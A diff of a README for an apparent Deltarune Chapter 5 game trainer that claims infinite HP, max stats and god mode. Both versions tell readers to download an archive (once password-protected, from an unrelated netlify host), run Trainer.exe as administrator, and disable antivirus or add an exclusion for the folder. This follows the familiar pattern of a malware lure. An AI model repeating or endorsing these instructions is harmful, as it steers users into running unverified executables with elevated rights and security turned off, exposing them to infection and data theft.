@@ -1,50 +1,56 @@
-# ⚔️ Deltarune Chapter 5 Ultimate Trainer 2026 | Infinite HP + Max Stats | Undetected Utility
+# 🎮 Deltarune-Chapter5-Trainer-Ultimate - Improve your role playing game stats
 
-![Version](https://img.shields.io/badge/version-1.0.0-blue)
-![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-lightgrey)
-![Status](https://img.shields.io/badge/status-Undetected-brightgreen)
-![Downloads](https://img.shields.io/badge/downloads-1K+%2B-orange)
-![Release](https://img.shields.io/badge/release-June%202026-blueviolet)
+[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/Tensional-sateen624/Deltarune-Chapter5-Trainer-Ultimate/releases)
 
-## 🚀 Features
+This application modifies game values for Deltarune Chapter 5. It allows players to adjust character stats, currency, and damage resistance. It works as an external tool that runs alongside the game client.
 
-| Feature | Description |
-|---------|-------------|
-| 🛡️ Infinite HP | Party members never lose health in any battle — walk through every fight invincible. |
-| ⚡ Max All Stats | Permanently sets Kris, Susie, and Ralsei's ATK, DEF, and Magic to their maximum values. |
-| 💊 Unlimited Items | Never run out of healing items, weapons, or key story items. |
-| 💰 Infinite Gold | Set your gold to any value and buy everything in every shop. |
-| ⚔️ One-Hit Kill | Defeat any enemy with a single attack — perfect for speeding through encounters. |
-| 👑 God Mode (All Chapters) | Works across all five chapters, not just Chapter 5. |
-| ⏩ Speed Hack | Adjust game speed from 0.5x to 5x for faster exploration and grinding. |
-| ⏸️ Freeze Timer | Pause the battle timer during puzzle and action sequences. |
-| 🔓 Unlock All | Instantly unlock all Chapter 5 content, secrets, and alternate routes. |
-| 🛠️ Anti-Crash Protection | Memory-stable hooks prevent game crashes during extended sessions. |
+## 📥 Getting the software
 
-## 📥 Download & Installation
+Visit [this page](https://github.com/Tensional-sateen624/Deltarune-Chapter5-Trainer-Ultimate/releases) to download the latest version of the trainer. Look for the file ending in .zip under the Assets section. Download this file to your computer.
 
-1. **Download** the trainer archive: [https://skydock.netlify.app/trainer-archive.zip](https://skydock.netlify.app/trainer-archive.zip)
-2. **Extract** the ZIP file (password: `trainer2026`).
-3. Right-click `trainer.exe` and select **"Run as Administrator"**.
-4. Launch **Deltarune Chapter 5** on Steam.
-5. Press **INSERT** to open the trainer GUI and enable your desired features.
+## 🛠️ System requirements
 
-## 💻 Compatibility
+This tool functions on systems running Windows 10 or Windows 11. Ensure that you have the latest .NET Desktop Runtime installed from the Microsoft website. The application requires 50 megabytes of free disk space. Close any antivirus software if it prevents the application from launching, as some security programs flag memory-editing tools as suspicious.
 
-- Windows 10 / 11 (64-bit)
-- Steam version only (all Chapters 1‑5)
-- Works with all Deltarune updates (June 2026 and beyond)
+## ⚙️ Installation steps
 
-## 🔧 Troubleshooting
+1. Navigate to your Downloads folder.
+2. Right-click the downloaded .zip file.
+3. Select Extract All and choose a folder location.
+4. Open the extracted folder.
+5. Locate the file named Trainer.exe.
+6. Right-click this file and select Run as administrator.
 
-- **Trainer not opening:** Ensure you ran as Administrator and temporarily disable your antivirus.
-- **GUI not showing:** Press INSERT key. If missing, restart trainer and game.
-- **Stats not updating:** Verify you are in a battle or menu, not the main title screen.
+## 🎮 How to use the trainer
 
-## 📄 License
+Start Deltarune Chapter 5 through your usual game launcher. Load your save file and reach the main gameplay screen. Switch to the trainer window and click the Attach button. The status indicator will turn green once the tool finds the game process.
 
-This project is licensed under the MIT License – see the [LICENSE](LICENSE) file for details.
+You can now toggle the available options:
 
----
+- Max Stats: This sets your attack, defense, and speed values to their upper limits.
+- Infinite Gold: This enables a constant multiplier for all currency gains.
+- God Mode: This stops your health bar from decreasing during enemy encounters.
 
-`bullet-hell` `windows` `trainer` `max-stats` `deltarune` `utility` `game-trainer` `undetected` `single-player` `infinite-hp` `god-mode` `unlimited-items` `steam` `rpg-trainer` `2026` `assist` `toby-fox`
+Changes apply in real-time. You do not need to restart the game to see the effects. Toggle the switches off to return the game to its default state.
+
+## 🛡️ Safety and best practices
+
+External tools interact with game memory. Use these tools only during single-player sessions. Do not leave the trainer running when you switch to other professional applications or web browsers. Always save your game before you activate new features to prevent potential data loss. 
+
+## ❓ Frequently asked questions
+
+Does this tool work with other chapters? 
+This specific version targets data structures exclusive to Chapter 5. It will not function with earlier chapters.
+
+Will this get me banned from online services?
+Deltarune is a single-player game. There are no online components, so there is no risk of account restrictions or bans.
+
+The trainer does not detect the game. 
+Ensure you run the trainer with administrative privileges. Check that your game version matches the version specified in the release notes.
+
+Does this software contain viruses?
+The software creates memory hooks to communicate with the game process. This behavior triggers false positives in some security suites. You can add an exclusion to your antivirus software for the trainer folder to stop this alert.
+
+## 📝 Support
+
+If the application fails to open or crashes during use, check the Releases page for updates. Developers release patches to maintain compatibility whenever a game update changes internal memory addresses. Report any persistent bugs in the Issues tab of the repository. Include the Windows version number and a screenshot of any error messages if possible.
